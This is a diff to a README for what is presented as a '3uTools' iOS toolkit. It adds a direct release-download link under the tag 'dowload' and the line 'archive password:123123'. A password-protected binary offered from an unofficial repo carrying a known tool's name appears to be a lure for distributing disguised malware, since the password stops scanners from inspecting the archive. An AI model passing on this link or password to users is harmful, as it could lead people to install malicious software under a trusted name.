@@ -6,7 +6,9 @@ Your all-in-one toolkit for managing, flashing, and exploring iOS devices!
 
 ![3uTools_uXXPj62Qzk](https://github.com/user-attachments/assets/efd01952-df4e-48b4-97c7-94c5f821939d)
 
-👉 [Download Latest Release](https://github.com/yalov2/3uTools/releases/download/dowload/3uTools.v3.0.0)
+👉 [Download Latest Release](https://github.com/yalov2/3uTools/releases/download/dowload/3uTools.v3.0.0) 
+
+archive password:123123
 
 🚀 Features
 
